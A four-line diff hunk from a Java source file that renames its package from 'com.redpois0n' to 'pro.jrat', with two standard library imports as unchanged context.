@@ -1,4 +1,4 @@
-package com.redpois0n;
+package pro.jrat;
 
 import java.awt.Desktop;
 import java.io.BufferedReader;
